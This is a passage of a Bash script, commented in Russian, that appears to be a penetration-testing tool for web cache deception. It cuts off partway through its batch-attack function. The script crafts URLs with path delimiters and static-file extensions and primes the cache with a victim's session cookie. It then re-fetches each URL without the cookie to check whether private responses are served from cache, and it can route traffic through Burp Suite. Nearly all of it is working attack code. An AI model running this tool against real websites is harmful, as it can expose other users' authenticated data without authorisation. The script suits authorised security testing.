#!/bin/bash
# =============================================================================
# wcd_gun.sh — Пулемёт для тестирования Web Cache Deception v7.2
# =============================================================================
# Назначение:
#   - Двухфазный обстрел: прогрев кэша (жертва) → проверка (атакующий)
#   - Одиночные выстрелы с гибкими аргументами:
#       single [разделитель] [расширение]
#       quick  [разделитель] [расширение]
#       show   [разделитель] [расширение]
#     Если аргумент опущен, используется первый элемент соответствующей обоймы.
#     Специальное значение "none" отключает параметр (пустой разделитель/расширение).
#   - Поддержка проксирования через Burp Suite (порт 8082)
#   - Проверка доступности Burp Suite перед началом работы
#   - ЧЕСТНОЕ отображение: с кукой или без
#   - Полные проверки всех параметров
#   - Подробные пояснения каждого шага в консоли
#   - Управление обоймами: добавление/удаление разделителей и расширений
# =============================================================================

# -----------------------------------------------------------------------------
# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
# -----------------------------------------------------------------------------
TARGET=""                                           # Цель атаки
COOKIE=""                                           # Кука для авторизации
DELIMITERS=(";" "." "?" "%00" "%23" "%3F" "%0A" "%09" "%20")  # Разделители
EXTENSIONS=(".css" ".js" ".jpg" ".ico")             # Статические расширения

# Настройки прокси (Burp Suite)
BURP_HOST="127.0.0.1"
BURP_PORT="8082"
USE_PROXY=false                                     # Использовать ли прокси
PROXY_STRING=""                                     # Строка для curl

# Файл для сохранения обойм
MAGAZINE_DIR="$HOME/.wcd_gun"

# -----------------------------------------------------------------------------
# ЦВЕТА ДЛЯ ВЫВОДА
# -----------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# =============================================================================
# ИНИЦИАЛИЗАЦИЯ ДИРЕКТОРИИ ДЛЯ ОБОЙМ
# =============================================================================
init_magazine_dir() {
    if [[ ! -d "$MAGAZINE_DIR" ]]; then
        mkdir -p "$MAGAZINE_DIR"
        echo -e "${GREEN}[+] Создана директория для обойм: $MAGAZINE_DIR${NC}"
    fi
}

# =============================================================================
# СОХРАНЕНИЕ ОБОЙМЫ РАЗДЕЛИТЕЛЕЙ
# =============================================================================
save_delimiters_magazine() {
    local magazine_name="$1"
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        return 1
    fi
    
    init_magazine_dir
    local file_path="$MAGAZINE_DIR/${magazine_name}.delimiters"
    
    printf "%s\n" "${DELIMITERS[@]}" > "$file_path"
    echo -e "${GREEN}[+] Обойма разделителей сохранена: $magazine_name${NC}"
    echo -e "${CYAN}    Файл: $file_path${NC}"
    echo -e "${CYAN}    Разделителей: ${#DELIMITERS[@]}${NC}"
}

# =============================================================================
# ЗАГРУЗКА ОБОЙМЫ РАЗДЕЛИТЕЛЕЙ
# =============================================================================
load_delimiters_magazine() {
    local magazine_name="$1"
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        return 1
    fi
    
    local file_path="$MAGAZINE_DIR/${magazine_name}.delimiters"
    
    if [[ ! -f "$file_path" ]]; then
        echo -e "${RED}[!] Обойма не найдена: $magazine_name${NC}"
        echo -e "${YELLOW}[*] Доступные обоймы разделителей:${NC}"
        list_delimiters_magazines
        return 1
    fi
    
    mapfile -t DELIMITERS < "$file_path"
    echo -e "${GREEN}[+] Обойма разделителей загружена: $magazine_name${NC}"
    echo -e "${CYAN}    Загружено разделителей: ${#DELIMITERS[@]}${NC}"
    show_delimiters
}

# =============================================================================
# СПИСОК ОБОЙМ РАЗДЕЛИТЕЛЕЙ
# =============================================================================
list_delimiters_magazines() {
    init_magazine_dir
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}📦 ОБОЙМЫ РАЗДЕЛИТЕЛЕЙ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    local found=0
    for mag in "$MAGAZINE_DIR"/*.delimiters; do
        if [[ -f "$mag" ]]; then
            local name=$(basename "$mag" .delimiters)
            local count=$(wc -l < "$mag")
            echo -e "  ${GREEN}•${NC} $name ${CYAN}($count разделителей)${NC}"
            found=1
        fi
    done 2>/dev/null
    
    if [[ $found -eq 0 ]]; then
        echo -e "${YELLOW}  Нет сохранённых обойм${NC}"
    fi
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# =============================================================================
# УДАЛЕНИЕ ОБОЙМЫ РАЗДЕЛИТЕЛЕЙ
# =============================================================================
delete_delimiters_magazine() {
    local magazine_name="$1"
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        return 1
    fi
    
    local file_path="$MAGAZINE_DIR/${magazine_name}.delimiters"
    
    if [[ ! -f "$file_path" ]]; then
        echo -e "${RED}[!] Обойма не найдена: $magazine_name${NC}"
        return 1
    fi
    
    rm "$file_path"
    echo -e "${YELLOW}[-] Обойма удалена: $magazine_name${NC}"
}

# =============================================================================
# СОХРАНЕНИЕ ОБОЙМЫ РАСШИРЕНИЙ
# =============================================================================
save_extensions_magazine() {
    local magazine_name="$1"
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        return 1
    fi
    
    init_magazine_dir
    local file_path="$MAGAZINE_DIR/${magazine_name}.extensions"
    
    printf "%s\n" "${EXTENSIONS[@]}" > "$file_path"
    echo -e "${GREEN}[+] Обойма расширений сохранена: $magazine_name${NC}"
    echo -e "${CYAN}    Файл: $file_path${NC}"
    echo -e "${CYAN}    Расширений: ${#EXTENSIONS[@]}${NC}"
}

# =============================================================================
# ЗАГРУЗКА ОБОЙМЫ РАСШИРЕНИЙ
# =============================================================================
load_extensions_magazine() {
    local magazine_name="$1"
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        return 1
    fi
    
    local file_path="$MAGAZINE_DIR/${magazine_name}.extensions"
    
    if [[ ! -f "$file_path" ]]; then
        echo -e "${RED}[!] Обойма не найдена: $magazine_name${NC}"
        echo -e "${YELLOW}[*] Доступные обоймы расширений:${NC}"
        list_extensions_magazines
        return 1
    fi
    
    mapfile -t EXTENSIONS < "$file_path"
    echo -e "${GREEN}[+] Обойма расширений загружена: $magazine_name${NC}"
    echo -e "${CYAN}    Загружено расширений: ${#EXTENSIONS[@]}${NC}"
    show_extensions
}

# =============================================================================
# СПИСОК ОБОЙМ РАСШИРЕНИЙ
# =============================================================================
list_extensions_magazines() {
    init_magazine_dir
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}📦 ОБОЙМЫ РАСШИРЕНИЙ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    local found=0
    for mag in "$MAGAZINE_DIR"/*.extensions; do
        if [[ -f "$mag" ]]; then
            local name=$(basename "$mag" .extensions)
            local count=$(wc -l < "$mag")
            echo -e "  ${GREEN}•${NC} $name ${CYAN}($count расширений)${NC}"
            found=1
        fi
    done 2>/dev/null
    
    if [[ $found -eq 0 ]]; then
        echo -e "${YELLOW}  Нет сохранённых обойм${NC}"
    fi
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# =============================================================================
# УДАЛЕНИЕ ОБОЙМЫ РАСШИРЕНИЙ
# =============================================================================
delete_extensions_magazine() {
    local magazine_name="$1"
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        return 1
    fi
    
    local file_path="$MAGAZINE_DIR/${magazine_name}.extensions"
    
    if [[ ! -f "$file_path" ]]; then
        echo -e "${RED}[!] Обойма не найдена: $magazine_name${NC}"
        return 1
    fi
    
    rm "$file_path"
    echo -e "${YELLOW}[-] Обойма удалена: $magazine_name${NC}"
}

# =============================================================================
# ПРОВЕРКА ДОСТУПНОСТИ BURP SUITE
# =============================================================================
check_burp() {
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ ПРОВЕРКА BURP SUITE                                         │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "${YELLOW}[*] Проверяю доступность Burp Suite на ${BURP_HOST}:${BURP_PORT}...${NC}"
    
    if command -v nc &>/dev/null; then
        if nc -z "$BURP_HOST" "$BURP_PORT" 2>/dev/null; then
            echo -e "${GREEN}[+] Burp Suite доступен на ${BURP_HOST}:${BURP_PORT}${NC}"
            
            local test_response=$(curl -s -o /dev/null -w "%{http_code}" --proxy "http://${BURP_HOST}:${BURP_PORT}" "http://detectportal.firefox.com/success.txt" 2>/dev/null | tr -d '"')
            if [[ "$test_response" == "200" ]]; then
                echo -e "${GREEN}[+] Прокси работает корректно (тестовый запрос прошёл)${NC}"
                return 0
            else
                echo -e "${YELLOW}[!] Порт открыт, но прокси не отвечает (HTTP $test_response)${NC}"
                return 1
            fi
        else
            echo -e "${RED}[!] Burp Suite НЕ ДОСТУПЕН на ${BURP_HOST}:${BURP_PORT}${NC}"
            return 1
        fi
    else
        local test_response=$(curl -s -o /dev/null -w "%{http_code}" --proxy "http://${BURP_HOST}:${BURP_PORT}" "http://detectportal.firefox.com/success.txt" 2>/dev/null | tr -d '"')
        if [[ "$test_response" == "200" ]]; then
            echo -e "${GREEN}[+] Burp Suite доступен и работает${NC}"
            return 0
        else
            echo -e "${RED}[!] Не удалось проверить Burp Suite (curl вернул $test_response)${NC}"
            return 1
        fi
    fi
}

# =============================================================================
# ЗАПУСК BURP SUITE (если не запущен)
# =============================================================================
launch_burp() {
    echo ""
    echo -e "${YELLOW}[?] Burp Suite не запущен. Запустить его? (y/n)${NC}"
    read -p "> " choice
    
    if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
        echo -e "${CYAN}[*] Пытаюсь запустить Burp Suite...${NC}"
        
        if command -v burpsuite &>/dev/null; then
            burpsuite &
            echo -e "${GREEN}[+] Burp Suite запущен в фоне${NC}"
        elif [[ -f "/usr/bin/burpsuite" ]]; then
            /usr/bin/burpsuite &
            echo -e "${GREEN}[+] Burp Suite запущен в фоне${NC}"
        elif [[ -f "/opt/BurpSuiteCommunity/BurpSuiteCommunity" ]]; then
            /opt/BurpSuiteCommunity/BurpSuiteCommunity &
            echo -e "${GREEN}[+] Burp Suite запущен в фоне${NC}"
        else
            echo -e "${RED}[!] Не могу найти исполняемый файл Burp Suite${NC}"
            echo -e "${YELLOW}[*] Запусти Burp Suite вручную и нажми Enter${NC}"
            read -p ""
        fi
        
        echo -e "${CYAN}[*] Жду запуска Burp Suite (10 секунд)...${NC}"
        sleep 10
        
        if check_burp; then
            return 0
        else
            echo -e "${RED}[!] Burp Suite всё ещё не отвечает${NC}"
            return 1
        fi
    else
        echo -e "${YELLOW}[*] Продолжаю БЕЗ проксирования${NC}"
        return 1
    fi
}

# =============================================================================
# НАСТРОЙКА ПРОКСИ
# =============================================================================
setup_proxy() {
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ НАСТРОЙКА ПРОКСИРОВАНИЯ                                     │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "${YELLOW}[?] Использовать Burp Suite для проксирования трафика? (y/n)${NC}"
    echo -e "${CYAN}    Это позволит видеть все запросы в Burp → HTTP History${NC}"
    read -p "> " choice
    
    if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
        if check_burp; then
            USE_PROXY=true
            PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
            echo -e "${GREEN}[+] Проксирование ВКЛЮЧЕНО: ${BURP_HOST}:${BURP_PORT}${NC}"
        else
            if launch_burp; then
                USE_PROXY=true
                PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
                echo -e "${GREEN}[+] Проксирование ВКЛЮЧЕНО: ${BURP_HOST}:${BURP_PORT}${NC}"
            else
                USE_PROXY=false
                PROXY_STRING=""
                echo -e "${YELLOW}[*] Проксирование ОТКЛЮЧЕНО${NC}"
            fi
        fi
    else
        USE_PROXY=false
        PROXY_STRING=""
        echo -e "${YELLOW}[*] Проксирование ОТКЛЮЧЕНО${NC}"
    fi
}

# =============================================================================
# ВЫПОЛНЕНИЕ CURL ЗАПРОСА
# =============================================================================
do_curl() {
    local url="$1"
    local options="$2"
    
    if [[ "$url" == https://* ]]; then
        if [[ -n "$PROXY_STRING" ]]; then
            curl -k $PROXY_STRING $options "$url" 2>/dev/null
        else
            curl -k $options "$url" 2>/dev/null
        fi
    else
        if [[ -n "$PROXY_STRING" ]]; then
            curl $PROXY_STRING $options "$url" 2>/dev/null
        else
            curl $options "$url" 2>/dev/null
        fi
    fi
}

# =============================================================================
# БАННЕР
# =============================================================================
banner() {
    clear
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}🔫 WCD GUN v7.2 — пулемёт для тестирования Web Cache Deception${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}🎯 Target:${NC} ${TARGET:-НЕ ЗАДАН}"
    echo -e "  ${YELLOW}🍪 Cookie:${NC} ${COOKIE:-НЕ ЗАДАНА}"
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "  ${MAGENTA}🔌 Proxy:${NC} ${BURP_HOST}:${BURP_PORT} ${GREEN}(Burp Suite)${NC}"
    else
        echo -e "  ${MAGENTA}🔌 Proxy:${NC} ${YELLOW}ОТКЛЮЧЕН${NC}"
    fi
    echo -e "  ${BLUE}📦 Разделителей:${NC} ${#DELIMITERS[@]}  ${BLUE}📦 Расширений:${NC} ${#EXTENSIONS[@]}"
    echo ""
}

# =============================================================================
# ПРОВЕРКА ДОСТУПНОСТИ ЦЕЛИ
# =============================================================================
check_target() {
    local url="${1:-$TARGET}"
    
    if [[ -z "$url" ]]; then
        echo -e "${RED}[!] ОШИБКА: Цель не задана. Используй set target <URL>${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[*] ПРОВЕРКА: Стучусь по адресу $url ...${NC}"
    
    local http_code=$(do_curl "$url" "-s -o /dev/null -w \"%{http_code}\"" | tr -d '"')
    
    if [[ "$http_code" =~ ^(200|302|301|401|403)$ ]]; then
        echo -e "${GREEN}[+] УСПЕХ: Цель доступна (HTTP $http_code)${NC}"
        return 0
    else
        echo -e "${RED}[!] ОШИБКА: Цель недоступна или вернула HTTP $http_code${NC}"
        return 1
    fi
}

# =============================================================================
# ПРОВЕРКА КУКИ
# =============================================================================
validate_cookie() {
    if [[ -z "$COOKIE" ]]; then
        return 1
    fi
    
    echo -e "${YELLOW}[*] ПРОВЕРКА КУКИ: Тестирую $COOKIE на $TARGET ...${NC}"
    
    local test_response=$(do_curl "$TARGET" "-s -I -b \"$COOKIE\"")
    local http_code=$(echo "$test_response" | head -1 | awk '{print $2}' | tr -d '\r\n')
    
    if [[ "$http_code" == "200" ]]; then
        echo -e "${GREEN}[+] КУКА ВАЛИДНА: Доступ к $TARGET разрешён (HTTP 200)${NC}"
        return 0
    elif [[ "$http_code" == "302" ]] || [[ "$http_code" == "301" ]]; then
        local location=$(echo "$test_response" | grep -i "^Location:" | awk '{print $2}' | tr -d '\r')
        echo -e "${YELLOW}[!] ПРЕДУПРЕЖДЕНИЕ: Кука ведёт на редирект ($location)${NC}"
        return 1
    else
        echo -e "${RED}[!] ОШИБКА: С кукой получен HTTP $http_code${NC}"
        return 1
    fi
}

# =============================================================================
# ОДИНОЧНЫЙ ВЫСТРЕЛ (полный цикл: прогрев + проверка)
# =============================================================================
single_shot() {
    local delim="$1"
    local ext="$2"

    # Обработка разделителя
    if [[ -z "$delim" ]]; then
        if [[ ${#DELIMITERS[@]} -gt 0 ]]; then
            delim="${DELIMITERS[0]}"
            echo -e "${YELLOW}[*] Разделитель не указан, использую первый из обоймы: '$delim'${NC}"
        else
            echo -e "${RED}[!] Обойма разделителей пуста, а разделитель не указан.${NC}"
            echo -e "${YELLOW}[*] Используйте 'add <разделитель>' для добавления.${NC}"
            return 1
        fi
    elif [[ "$delim" == "none" ]]; then
        delim=""
        echo -e "${YELLOW}[*] Разделитель отключен (none)${NC}"
    fi

    # Обработка расширения
    if [[ -z "$ext" ]]; then
        if [[ ${#EXTENSIONS[@]} -gt 0 ]]; then
            ext="${EXTENSIONS[0]}"
            echo -e "${YELLOW}[*] Расширение не указано, использую первое из обоймы: '$ext'${NC}"
        else
            echo -e "${RED}[!] Обойма расширений пуста, а расширение не указано.${NC}"
            echo -e "${YELLOW}[*] Используйте 'addext <расширение>' для добавления.${NC}"
            return 1
        fi
    elif [[ "$ext" == "none" ]]; then
        ext=""
        echo -e "${YELLOW}[*] Расширение отключено (none)${NC}"
    fi

    # Добавляем точку к расширению, если оно не пустое и не начинается с точки
    if [[ -n "$ext" && "$ext" != .* ]]; then
        ext=".$ext"
    fi

    if ! check_target; then
        return 1
    fi

    # Формирование URL
    local attack_url
    if [[ -n "$delim" ]]; then
        attack_url="${TARGET}${delim}test${ext}"
    else
        attack_url="${TARGET}test${ext}"
    fi

    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  🔫 ОДИНОЧНЫЙ ВЫСТРЕЛ                                         ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ ЦЕЛЬ: ${WHITE}$attack_url${NC}"
    echo -e "${CYAN}│ РАЗДЕЛИТЕЛЬ: ${WHITE}${delim:-<нет>}${NC}"
    echo -e "${CYAN}│ РАСШИРЕНИЕ: ${WHITE}${ext:-<нет>}${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    # ФАЗА 1: ПРОГРЕВ
    echo -e "${YELLOW}[*] ФАЗА 1: ПРОГРЕВ КЭША${NC}"
    echo -e "${CYAN}    Отправляю запрос для прогрева кэша...${NC}"

    if [[ -n "$COOKIE" ]]; then
        echo -e "${CYAN}    Режим: ${GREEN}С КУКОЙ${CYAN} (имитация жертвы)${NC}"
        do_curl "$attack_url" "-s -o /dev/null -b \"$COOKIE\""
    else
        echo -e "${CYAN}    Режим: ${YELLOW}БЕЗ КУКИ${NC}"
        do_curl "$attack_url" "-s -o /dev/null"
    fi

    echo -e "${GREEN}    ✓ Запрос отправлен${NC}"
    echo -e "${CYAN}    Жду 2 секунды для сохранения в кэш...${NC}"
    sleep 2

    # ФАЗА 2: ПРОВЕРКА (БЕЗ КУКИ)
    echo ""
    echo -e "${YELLOW}[*] ФАЗА 2: ПРОВЕРКА КЭША${NC}"
    echo -e "${CYAN}    Отправляю запрос ${RED}БЕЗ КУКИ${CYAN} (имитация атакующего)...${NC}"

    local response=$(do_curl "$attack_url" "-s -I")
    local cache_status=$(echo "$response" | grep -i "X-Cache-Status" | head -1 | awk '{print $2}' | tr -d '\r')
    local bypass=$(echo "$response" | grep -i "X-WCD-Bypass" | head -1 | awk '{print $2}' | tr -d '\r')
    local http_code=$(echo "$response" | head -1 | awk '{print $2}' | tr -d '\r\n')

    echo ""
    echo -e "${WHITE}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${WHITE}│ РЕЗУЛЬТАТ                                                    │${NC}"
    echo -e "${WHITE}├─────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${WHITE}│ URL:      $attack_url${NC}"
    echo -e "${WHITE}│ HTTP:     $http_code${NC}"
    echo -e "${WHITE}│ Cache:    ${cache_status:-НЕТ ЗАГОЛОВКА}${NC}"
    echo -e "${WHITE}│ Bypass:   ${bypass:-нет}${NC}"
    echo -e "${WHITE}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    # Анализ результата
    if [[ "$cache_status" == "HIT" ]]; then
        echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║  ⚠️  ПРОБИТИЕ! УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА!                       ║${NC}"
        echo -e "${RED}║  Кэш отдал приватные данные БЕЗ КУКИ!                         ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"
    elif [[ "$cache_status" == "BYPASS" ]]; then
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  ✅ ЗАЩИТА СРАБОТАЛА                                          ║${NC}"
        echo -e "${GREEN}║  Nginx обошёл кэш, атака отражена.                            ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
    elif [[ "$cache_status" == "MISS" ]]; then
        echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║  📝 ПРОМАХ КЭША                                               ║${NC}"
        echo -e "${YELLOW}║  Ответ не был закэширован.                                    ║${NC}"
        echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════════╝${NC}"
    else
        echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║  ❓ НЕТ ЗАГОЛОВКА X-Cache-Status                              ║${NC}"
        echo -e "${BLUE}║  Возможно, прокси не настроен или ответ не из кэша.           ║${NC}"
        echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    fi
    echo ""
}

# =============================================================================
# БЫСТРЫЙ ОДИНОЧНЫЙ ВЫСТРЕЛ (только проверка, без прогрева)
# =============================================================================
quick_shot() {
    local delim="$1"
    local ext="$2"

    # Обработка разделителя
    if [[ -z "$delim" ]]; then
        if [[ ${#DELIMITERS[@]} -gt 0 ]]; then
            delim="${DELIMITERS[0]}"
            echo -e "${YELLOW}[*] Разделитель не указан, использую первый из обоймы: '$delim'${NC}"
        else
            echo -e "${RED}[!] Обойма разделителей пуста, а разделитель не указан.${NC}"
            return 1
        fi
    elif [[ "$delim" == "none" ]]; then
        delim=""
        echo -e "${YELLOW}[*] Разделитель отключен (none)${NC}"
    fi

    # Обработка расширения
    if [[ -z "$ext" ]]; then
        if [[ ${#EXTENSIONS[@]} -gt 0 ]]; then
            ext="${EXTENSIONS[0]}"
            echo -e "${YELLOW}[*] Расширение не указано, использую первое из обоймы: '$ext'${NC}"
        else
            echo -e "${RED}[!] Обойма расширений пуста, а расширение не указано.${NC}"
            return 1
        fi
    elif [[ "$ext" == "none" ]]; then
        ext=""
        echo -e "${YELLOW}[*] Расширение отключено (none)${NC}"
    fi

    if [[ -n "$ext" && "$ext" != .* ]]; then
        ext=".$ext"
    fi

    if ! check_target; then
        return 1
    fi

    local attack_url
    if [[ -n "$delim" ]]; then
        attack_url="${TARGET}${delim}test${ext}"
    else
        attack_url="${TARGET}test${ext}"
    fi

    echo ""
    echo -e "${CYAN}[*] БЫСТРЫЙ ВЫСТРЕЛ: $attack_url${NC}"

    local response=$(do_curl "$attack_url" "-s -I")
    local cache_status=$(echo "$response" | grep -i "X-Cache-Status" | head -1 | awk '{print $2}' | tr -d '\r')
    local http_code=$(echo "$response" | head -1 | awk '{print $2}' | tr -d '\r\n')

    if [[ "$cache_status" == "HIT" ]]; then
        echo -e "${RED}[!] HIT! $attack_url (HTTP $http_code)${NC}"
    elif [[ "$cache_status" == "BYPASS" ]]; then
        echo -e "${GREEN}[✓] BYPASS $attack_url (HTTP $http_code)${NC}"
    elif [[ "$cache_status" == "MISS" ]]; then
        echo -e "${YELLOW}[?] MISS $attack_url (HTTP $http_code)${NC}"
    else
        echo -e "${BLUE}[ ] NO_CACHE $attack_url (HTTP $http_code)${NC}"
    fi
    echo ""
}

# =============================================================================
# ПОКАЗАТЬ ОТВЕТ ЦЕЛИКОМ (для отладки)
# =============================================================================
show_response() {
    local delim="$1"
    local ext="$2"

    # Обработка разделителя
    if [[ -z "$delim" ]]; then
        if [[ ${#DELIMITERS[@]} -gt 0 ]]; then
            delim="${DELIMITERS[0]}"
            echo -e "${YELLOW}[*] Разделитель не указан, использую первый из обоймы: '$delim'${NC}"
        else
            echo -e "${RED}[!] Обойма разделителей пуста, а разделитель не указан.${NC}"
            return 1
        fi
    elif [[ "$delim" == "none" ]]; then
        delim=""
        echo -e "${YELLOW}[*] Разделитель отключен (none)${NC}"
    fi

    # Обработка расширения
    if [[ -z "$ext" ]]; then
        if [[ ${#EXTENSIONS[@]} -gt 0 ]]; then
            ext="${EXTENSIONS[0]}"
            echo -e "${YELLOW}[*] Расширение не указано, использую первое из обоймы: '$ext'${NC}"
        else
            echo -e "${RED}[!] Обойма расширений пуста, а расширение не указано.${NC}"
            return 1
        fi
    elif [[ "$ext" == "none" ]]; then
        ext=""
        echo -e "${YELLOW}[*] Расширение отключено (none)${NC}"
    fi

    if [[ -n "$ext" && "$ext" != .* ]]; then
        ext=".$ext"
    fi

    local attack_url
    if [[ -n "$delim" ]]; then
        attack_url="${TARGET}${delim}test${ext}"
    else
        attack_url="${TARGET}test${ext}"
    fi

    echo ""
    echo -e "${CYAN}[*] ЗАПРОС К: $attack_url${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"

    if [[ -n "$COOKIE" ]]; then
        echo -e "${YELLOW}[*] С кукой: $COOKIE${NC}"
        do_curl "$attack_url" "-i -b \"$COOKIE\""
    else
        echo -e "${YELLOW}[*] Без куки${NC}"
        do_curl "$attack_url" "-i"
    fi

    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# =============================================================================
# ДВУХФАЗНЫЙ ОБСТРЕЛ
# =============================================================================
fire() {
    if ! check_target; then
        return 1
    fi
    
    local cookie_status=""
    local use_cookie=false
    
    if [[ -n "$COOKIE" ]]; then
        echo ""
        echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${CYAN}│ ПРОВЕРКА ПАРАМЕТРОВ ПЕРЕД ОБСТРЕЛОМ                         │${NC}"
        echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
        
        if validate_cookie; then
            cookie_status="ВАЛИДНАЯ КУКА"
            use_cookie=true
        else
            echo -e "${YELLOW}[?] Кука не прошла проверку. Использовать всё равно? (y/n)${NC}"
            read -p "> " choice
            if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
                cookie_status="НЕВАЛИДНАЯ КУКА (использую принудительно)"
                use_cookie=true
            else
                cookie_status="БЕЗ КУКИ"
                use_cookie=false
                COOKIE=""
            fi
        fi
    else
        cookie_status="БЕЗ КУКИ"
        use_cookie=false
    fi

    local total_tests=$((${#DELIMITERS[@]} * ${#EXTENSIONS[@]}))
    local current=0
    local hits=0
    local bypasses=0
    local misses=0
    local errors=0

    # =========================================================================
    # ФАЗА 1: ПРОГРЕВ
    # =========================================================================
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  🔥 ФАЗА 1: ПРОГРЕВ КЭША                                      ║${NC}"
    echo -e "${MAGENTA}║  Имитация действий ЖЕРТВЫ — запись ответов в кэш              ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ РЕЖИМ ПРОГРЕВА: ${WHITE}$cookie_status${NC}"
    echo -e "${CYAN}├─────────────────────────────────────────────────────────────┤${NC}"
    if [[ "$use_cookie" == true ]]; then
        echo -e "${CYAN}│ Запросы отправляются ${GREEN}С КУКОЙ${CYAN} (имитация жертвы)             │${NC}"
    else
        echo -e "${CYAN}│ Запросы отправляются ${YELLOW}БЕЗ КУКИ${CYAN} (кука не задана)           │${NC}"
    fi
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "${CYAN}│ Трафик идёт через ${MAGENTA}Burp Suite (${BURP_HOST}:${BURP_PORT})${CYAN}            │${NC}"
    fi
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    for delim in "${DELIMITERS[@]}"; do
        for ext in "${EXTENSIONS[@]}"; do
            ((current++))
            local attack_url="${TARGET}${delim}test${ext}"
            
            printf "  [%3d/%3d] ПРОГРЕВ: %s" $current $total_tests "$attack_url"
            
            if [[ "$use_cookie" == true ]]; then
                do_curl "$attack_url" "-s -o /dev/null -b \"$COOKIE\""
                echo -e " ${GREEN}✓ (с кукой)${NC}"
            else
                do_curl "$attack_url" "-s -o /dev/null"
                echo -e " ${YELLOW}✓ (без куки)${NC}"
            fi
            sleep 0.2
        done
    done

    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ ФАЗА 1 ЗАВЕРШЕНА. Всего отправлено запросов: $total_tests${NC}"
    echo -e "${CYAN}│ Жду 2 секунды для сохранения кэша...                         │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    sleep 2

    # =========================================================================
    # ФАЗА 2: ПРОВЕРКА
    # =========================================================================
    current=0
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  🔍 ФАЗА 2: ПРОВЕРКА КЭША                                     ║${NC}"
    echo -e "${MAGENTA}║  Имитация действий АТАКУЮЩЕГО — попытка украсть кэш           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ РЕЖИМ ПРОВЕРКИ: ${RED}ВСЕГДА БЕЗ КУКИ${CYAN} (имитация атакующего)    │${NC}"
